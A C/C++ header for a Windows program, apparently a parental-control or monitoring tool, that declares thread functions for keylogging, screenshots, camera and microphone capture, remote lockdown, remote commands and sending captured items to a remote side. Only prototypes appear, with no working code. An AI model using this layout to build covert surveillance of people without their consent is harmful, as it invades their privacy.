#pragma once
#include <windows.h>
#include "../Control/keylogger.h"
#include "../Control/Recorder.h"
#include "../Control/camera.h"
#include "../DataManagement/Converters.h"
#include "../Network/Request.h"
#include "../Control/Screenshoter.h"

#pragma warning(disable:4996) // Disable "unsafe" warnings
#define SYNC_TIME 60000 // 1 minute

DWORD WINAPI initFiltering(LPVOID lpParam);
DWORD WINAPI initKeylogger(LPVOID lpParam);
DWORD WINAPI initScreenshot(LPVOID lpParam);
DWORD WINAPI initTimeLockdown(LPVOID lpParam);
DWORD WINAPI initCamera(LPVOID lpParam);
DWORD WINAPI initMic(LPVOID lpParam);
DWORD WINAPI initRemoteLockdown(LPVOID lpParam);
DWORD WINAPI initRemoteCommands(LPVOID lpParam);
DWORD WINAPI sendItem(LPVOID lpParam, LPSTR itemType);
DWORD WINAPI getItem(LPVOID lpParam, LPSTR itemType);
